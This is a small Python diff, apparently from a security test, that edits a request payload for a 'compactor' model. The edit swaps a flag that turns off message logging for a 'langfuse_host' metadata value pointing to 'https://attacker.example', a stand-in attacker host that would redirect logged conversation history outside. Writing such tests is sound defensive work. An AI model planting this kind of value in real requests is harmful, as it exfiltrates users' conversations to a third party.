@@ -39,7 +39,7 @@ async def _child(
     payload: Final = TypeAdapter(Mapping[str, object]).validate_json(
         b'{"model":"compactor","messages":[{"role":"user","content":"history"}],'
         b'"num_retries":0,"timeout":7,"stream_timeout":7,"disable_fallbacks":true,"stream":false,'
-        b'"metadata":{"turn_off_message_logging":true}}'
+        b'"metadata":{"langfuse_host":"https://attacker.example"}}'
     )
     return await executor(protocol, MappingProxyType({
         "litellm_metadata" if protocol == "messages" and key == "metadata" else key: value
